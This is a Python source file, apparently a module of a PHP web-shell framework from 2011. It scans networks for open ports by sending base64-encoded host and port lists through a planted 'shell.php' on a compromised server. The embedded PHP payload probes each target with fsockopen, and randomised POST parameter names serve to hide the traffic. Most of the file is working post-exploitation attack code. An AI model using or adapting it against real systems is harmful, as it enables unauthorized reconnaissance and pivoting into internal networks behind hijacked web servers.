'''
Created on 20/set/2011

@author: norby
'''


from core.module import Module, ModuleException
from core.vector import VectorList, Vector as V
from core.parameters import ParametersList, Parameter as P

from external.ipaddr import IPNetwork, IPAddress, summarize_address_range
from random import choice
from base64 import b64encode

classname = 'Scan'
    
    
class RequestList(dict):
    
    
    def __init__(self, modhandler):
        
        self.modhandler = modhandler
        
        self.port_list = []
        self.ifaces = {}
        
        dict.__init__(self)
        
        
    def get_requests(self, howmany = 30):
        
        to_return = {}
        requests = 0
        
        # Filling request 
        
        for ip in self:
            while self[ip]:
                if requests >= howmany:
                    break
                
                if ip not in to_return:
                    to_return[ip] = []
                
                to_return[ip].append(self[ip].pop(0))
                
                requests+=1
            
            if requests >= howmany:
                break
            
        
        # Removing empty ips
        for ip, ports in self.items():
            if not ports:
                del self[ip]
            
        return to_return        
                
        
    def add(self, net, port):
        """ First add port to duplicate for every inserted host """


        if ',' in port:
            port_ranges = port.split(',')
        else:
            port_ranges = [ port ]    
        
        for ports in port_ranges:
            self.__set_port_ranges(ports)
        
        
        if ',' in net:
            addresses = net.split(',')
        else:
            addresses = [ net ]    
        
        for addr in addresses:
            self.__set_networks(addr)
        
    def __set_port_ranges(self, given_range):

            start_port = None
            end_port = None
            

            if given_range.count('-') == 1:
                try:
                    splitted_ports = [ int(strport) for strport in given_range.split('-') if (int(strport) > 0 and int(strport) <= 65535)]
                except ValueError:
                    return None
                else:
                    if len(splitted_ports) == 2:
                        start_port = splitted_ports[0]
                        end_port = splitted_ports[1]
                        
            else:
                try:
                    int_port = int(given_range)
                except ValueError:
                    return None   
                else:
                    start_port = int_port
                    end_port = int_port
                    
            self.port_list += [ p for p in range(start_port, end_port+1)]
                    

    def __get_network_from_ifaces(self, iface):
        
        if not self.ifaces:
            
            self.modhandler.set_verbosity(6)
            self.modhandler.load('net.ifaces').run()
            self.modhandler.set_verbosity()
            
            self.ifaces = self.modhandler.load('net.ifaces').ifaces
            
        
        if iface in self.ifaces.keys():
             return self.ifaces[iface]
                       
            


    def __set_networks(self, addr):
        
        
        networks = []
        
        try:
            # Parse single IP or networks
            networks.append(IPNetwork(addr))
        except ValueError:
            
            #Parse IP-IP
            if addr.count('-') == 1:
                splitted_addr = addr.split('-')
                # Only adress supported
                
                try:
                    start_address = IPAddress(splitted_addr[0])
                    end_address = IPAddress(splitted_addr[1])
                except ValueError:
                    pass
                else:
                    networks += summarize_address_range(start_address, end_address)
            else:
                
                # Parse interface name
                remote_iface = self.__get_network_from_ifaces(addr)
                if remote_iface:
                    networks.append(remote_iface)  

        if not networks:       
            print '[net.scan] Warning: \'%s\' is not an IP address, network or detected interaface' % ( addr)
            
        else:
            for net in networks:
                for ip in net:
                    self[str(ip)] = self.port_list[:]

    
    
class Scan(Module):

    params = ParametersList('Scan network for open ports', [],
                    P(arg='addr', help='IP address, multiple addresses (IP1,IP2,..), networks (IP/MASK or IPstart-IPend) or interfaces (eth0)', required=True, pos=0),
                    P(arg='port', help='Port or multiple ports (PORT1, PORT2,.. or startPORT-endPORT)', required=True, pos=1))

    
    vector_scan = """
$str = base64_decode($_POST["%s"]);
foreach (explode(',', $str) as $s) {
$s2 = explode(' ', $s);
foreach( explode('|', $s2[1]) as $p) {
if($fp = fsockopen("$s2[0]", $p, $timeout=1)) {print("\nOPEN: $s2[0]:$p\n"); fclose($fp);}
else { print("."); }    
}}
"""

    def __init__(self, modhandler, url, password):
        self.reqlist = RequestList(modhandler)

        self.rand_post_addr = ''.join([choice('abcdefghijklmnopqrstuvwxyz') for i in xrange(4)])
        self.rand_post_port = ''.join([choice('abcdefghijklmnopqrstuvwxyz') for i in xrange(4)])
        
        
        Module.__init__(self, modhandler, url, password)    

    
    def run_module(self, addr, port):
        
        self.reqlist.add(addr, port)
        
        while self.reqlist:
            
            reqstringarray = ''
            
            requests = self.reqlist.get_requests(10)

            for host, ports in requests.items():
                
                reqstringarray += '%s %s,' % (host, '|'.join(map(str, (ports) )))
                
            reqstringarray = '%s' % reqstringarray[:-1]
                    
            payload = self.vector_scan % (self.rand_post_addr)
            self.modhandler.load('shell.php').set_post_data({self.rand_post_addr : b64encode(reqstringarray)})
        
            print self.modhandler.load('shell.php').run({0 : payload})

